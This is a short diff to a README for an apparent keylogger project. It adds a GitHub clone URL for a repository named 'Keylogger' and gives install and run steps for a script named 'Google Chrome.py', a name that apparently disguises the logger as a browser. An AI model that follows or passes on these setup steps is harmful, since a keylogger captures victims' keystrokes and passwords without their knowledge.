@@ -1,5 +1,5 @@
 ## Steps to run it
-1. do git clone repo url
+1. do 'git clone https://github.com/h4mmad/Keylogger'
 2. pip install requirements.txt
 3. run python 'Google Chrome.py'
 4. It should work
